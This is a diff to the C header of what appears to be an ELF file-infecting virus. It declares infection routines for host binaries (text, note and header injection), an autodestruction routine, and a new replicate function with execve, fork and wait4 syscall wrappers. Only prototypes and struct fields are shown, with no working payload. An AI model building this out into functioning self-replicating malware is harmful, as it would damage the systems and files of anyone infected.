@@ -87,7 +87,7 @@ struct s_host
 	Elf64_Ehdr *header;
 
 	size_t filesize;
-	const char *filename;
+	char *filename;
 
 	struct s_note *note;
 	struct s_text *text;
@@ -115,12 +115,13 @@ void __entry(void);
 void antivirus(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void init(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, const size_t size, enum e_context context);
-void host_constructor(struct s_host *host, struct s_keychain *keychain, const char *filename, enum e_context context);
+void host_constructor(struct s_host *host, struct s_keychain *keychain, char *filename, enum e_context context);
 void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_context contect);
 void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
+void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void execution(const struct s_host *host, const struct s_keychain *keychain, const enum e_context context);
 
@@ -144,6 +145,9 @@ void *_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset
 ssize_t _write(int fd, const void *buf, size_t count);
 int _munmap(void *addr, size_t length);
 void _fatal(void);
+int _execve(const char *filename, char *const argv[], char *const envp[]);
+pid_t _fork(void);
+pid_t _wait4(pid_t pid, int *wstatus, int options, struct rusage *rusage);
 
 // TOOLS
 size_t _strlen(const char *str);
